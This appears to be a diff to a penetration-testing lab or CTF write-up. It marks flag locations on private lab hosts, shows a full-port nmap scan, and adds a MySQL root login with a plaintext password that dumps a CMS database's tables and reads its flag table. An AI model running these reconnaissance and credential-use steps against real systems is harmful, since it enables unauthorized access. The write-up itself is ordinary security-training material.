@@ -25,7 +25,7 @@ sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oG portScan.grep
 
 ## Open Ports and Running Services
 
-### 172.16.64.81
+### 172.16.64.81 \(flag in mysql\)
 
 | Port Number | Service | Version |
 | :--- | :--- | :--- |
@@ -49,7 +49,7 @@ sudo nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oG portScan.grep
 | 80 | http | Apache httpd 2.4.18 \(Ubuntu\) |
 | 63306 | mysql | MySQL 5.7.25-0ubuntu0.16.04.2 |
 
-### 172.16.64.166
+### 172.16.64.166 \(flag under sabrina user\)
 
 | Port Number | Service | Version |
 | :--- | :--- | :--- |
@@ -169,5 +169,53 @@ X-DB-name: mysql
 # Working:
 
 mysql --host=172.16.64.81 --user=root --password=x41x41x412019! --port 13306 mysql
+> show databases;
+> use cmsbase;
+> show tables;
++----------------------------+
+| Tables_in_cmsbase          |
++----------------------------+
+| flag                       |
+| sqlmapfile                 |
+| tbl_1_actions_log          |
+| tbl_1_categories           |
+| tbl_1_categories_relations |
+| tbl_1_downloads            |
+| tbl_1_files                |
+| tbl_1_files_relations      |
+| tbl_1_folders              |
+| tbl_1_groups               |
+| tbl_1_members              |
+| tbl_1_members_requests     |
+| tbl_1_notifications        |
+| tbl_1_options              |
+| tbl_1_password_reset       |
+| tbl_1_users                |
+| tbl_actions_log            |
+| tbl_categories             |
+| tbl_categories_relations   |
+| tbl_downloads              |
+| tbl_files                  |
+| tbl_files_relations        |
+| tbl_folders                |
+| tbl_groups                 |
+| tbl_members                |
+| tbl_members_requests       |
+| tbl_notifications          |
+| tbl_options                |
+| tbl_password_reset         |
+| tbl_users                  |
++----------------------------+
+30 rows in set (0.141 sec)
+
+MySQL [cmsbase]> select * from cmsbase.flag
+    -> ;
++----+------------------------------+
+| id | content                      |
++----+------------------------------+
+|  1 | Congratulations, you got it! |
++----+------------------------------+
+1 row in set (0.141 sec)
+
 ```
 
